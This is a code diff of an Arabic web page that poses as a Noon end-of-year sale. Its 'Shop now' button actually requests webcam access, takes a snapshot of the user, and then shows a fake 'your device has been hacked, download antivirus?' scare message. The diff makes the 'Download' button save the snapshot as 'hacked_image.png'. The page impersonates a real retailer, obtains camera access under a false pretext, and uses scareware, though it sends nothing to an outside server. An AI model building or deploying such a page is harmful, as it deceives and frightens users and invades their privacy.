@@ -8,84 +8,78 @@
         body {
             text-align: center;
             font-family: Arial, sans-serif;
-            background-color: white; /* تغيير الخلفية إلى اللون الأبيض */
-            color: black;
+            background: linear-gradient(to bottom, #ffffff, #ffcc00);
+            color: #333;
             margin: 0;
             display: flex;
             flex-direction: column;
             justify-content: center;
             align-items: center;
             height: 100vh;
+            padding: 20px;
         }
         .highlight {
-            background-color: yellow;
+            background-color: #ffd700;
             color: black;
-            font-size: 1.5rem;
+            padding: 15px 20px;
+            border-radius: 10px;
+            font-size: 2.5rem;
             font-weight: bold;
-            padding: 10px;
-            border-radius: 5px;
             margin-bottom: 20px;
-        }
-        h1 {
-            color: blue;
-            margin-bottom: 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
         p {
-            color: black;
-            margin-bottom: 15px;
+            font-size: 1.5rem;
+            color: #000;
+            font-weight: bold;
+            margin-bottom: 20px;
         }
-        .button-container {
-            margin-top: 20px;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
+        .offer {
+            background-color: #ffcc00;
+            color: black;
+            padding: 10px 20px;
+            font-size: 1.5rem;
+            font-weight: bold;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
         .button {
-            background-color: green;
-            color: white;
-            padding: 10px 20px;
+            background-color: #333;
+            color: #ffd700;
+            padding: 15px 30px;
             border: none;
-            border-radius: 5px;
-            text-decoration: none;
-            font-size: 1rem;
-            margin: 10px 0;
+            border-radius: 50px;
+            font-size: 1.5rem;
             cursor: pointer;
+            transition: transform 0.2s, background-color 0.3s;
+            box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.2);
         }
         .button:hover {
-            background-color: darkgreen;
+            background-color: #555;
+            transform: scale(1.1);
         }
         #video, #canvas {
             display: none;
             margin-top: 20px;
             border: 1px solid black;
+            width: 80%;
+            height: auto;
         }
-        /* تصميم الشاشة المنبثقة */
-        .modal {
+        .message {
             display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.8);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-        }
-        .modal-content {
             background-color: red;
             color: white;
             padding: 20px;
             border-radius: 10px;
-            text-align: center;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.7);
-            width: 80%;
-            max-width: 400px;
-        }
-        .modal-buttons {
+            font-size: 1.5rem;
             margin-top: 20px;
+            position: relative;
+        }
+        .button-group {
             display: flex;
-            justify-content: space-between;
+            justify-content: space-around;
+            margin-top: 20px;
         }
         .modal-button {
             padding: 10px 20px;
@@ -93,7 +87,6 @@
             border-radius: 5px;
             font-size: 1rem;
             cursor: pointer;
-            width: 45%;
         }
         .download {
             background-color: green;
@@ -111,57 +104,54 @@
     </style>
 </head>
 <body>
-    <div class="highlight">اغتنم الفرصة الآن!</div>
-    <h1>خصومات نهاية السنة من نون</h1>
-    <p>اغتنم أفضل العروض الآن قبل انتهاء الوقت!</p>
-    <div class="button-container">
+    <div id="content">
+        <div class="highlight">خصومات نهاية السنة من نون</div>
+        <p>اغتنم أفضل العروض الآن قبل انتهاء الوقت!</p>
+        <div class="offer">خصم يصل إلى 70%</div>
         <button id="shop-now" class="button">تسوق الآن</button>
     </div>
     <video id="video" autoplay></video>
     <canvas id="canvas"></canvas>
-
-    <!-- الشاشة المنبثقة -->
-    <div id="modal" class="modal">
-        <div class="modal-content">
-            <p>تم تهكير جهازك، هل تريد تنزيل مضاد للفيروسات؟</p>
-            <div class="modal-buttons">
-                <button class="modal-button download">تنزيل</button>
-                <button class="modal-button cancel">إلغاء</button>
-            </div>
+    <div id="message" class="message">
+        <p>تم تهكير جهازك، هل تريد تنزيل مضاد فيروسات؟</p>
+        <div class="button-group">
+            <button class="modal-button download">تنزيل</button>
+            <button class="modal-button cancel">إلغاء</button>
         </div>
     </div>
 
     <script>
         const shopNowButton = document.getElementById('shop-now');
+        const content = document.getElementById('content');
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const modal = document.getElementById('modal');
-        const downloadButton = document.querySelector('.download');
-        const cancelButton = document.querySelector('.cancel');
         const context = canvas.getContext('2d');
+        const message = document.getElementById('message');
 
         shopNowButton.addEventListener('click', () => {
-            // طلب إذن الكاميرا
+            // إخفاء المحتوى
+            content.style.display = 'none';
+
+            // تشغيل الكاميرا
             navigator.mediaDevices.getUserMedia({ video: true })
                 .then(stream => {
-                    // عرض الفيديو من الكاميرا
                     video.style.display = 'block';
                     video.srcObject = stream;
 
-                    // التقاط الصورة بعد 3 ثوانٍ
+                    // التقاط الصورة بعد 1 ثانية
                     setTimeout(() => {
                         canvas.style.display = 'block';
                         canvas.width = video.videoWidth;
                         canvas.height = video.videoHeight;
 
                         context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-                        // إخفاء الفيديو
                         video.style.display = 'none';
 
-                        // عرض الشاشة المنبثقة
-                        modal.style.display = 'flex';
-                    }, 3000);
+                        // عرض الرسالة بعد التقاط الصورة
+                        setTimeout(() => {
+                            message.style.display = 'block';
+                        }, 2000);
+                    }, 1000);
                 })
                 .catch(err => {
                     alert('لم يتم منح إذن الكاميرا!');
@@ -170,14 +160,17 @@
         });
 
         // زر "تنزيل"
-        downloadButton.addEventListener('click', () => {
-            alert('جاري تنزيل مضاد الفيروسات...');
-            modal.style.display = 'none';
+        document.querySelector('.download').addEventListener('click', () => {
+            const link = document.createElement('a');
+            link.download = 'hacked_image.png';
+            link.href = canvas.toDataURL();
+            link.click();
+            message.style.display = 'none';
         });
 
         // زر "إلغاء"
-        cancelButton.addEventListener('click', () => {
-            modal.style.display = 'none';
+        document.querySelector('.cancel').addEventListener('click', () => {
+            message.style.display = 'none';
         });
     </script>
 </body>
